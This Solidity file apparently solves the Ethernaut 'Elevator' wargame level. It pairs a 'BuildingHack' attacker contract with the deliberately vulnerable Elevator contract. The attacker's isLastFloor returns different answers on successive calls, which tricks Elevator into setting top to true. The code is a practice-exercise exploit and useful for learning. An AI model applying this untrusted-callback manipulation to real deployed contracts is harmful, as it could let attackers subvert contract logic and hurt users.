// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract BuildingHack {
    
    bool public lastFloor;
    Elevator public elevatorContract;

    constructor (address _elevatorAddress){
        lastFloor = false;
        elevatorContract = Elevator(_elevatorAddress);
    }
    
    function isLastFloor(uint floor) external returns (bool){
        if(!lastFloor){
            lastFloor = true;
            return false;
        }
        return true;
    }

    function goToLastFloor() external{
        elevatorContract.goTo(1);
    }
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}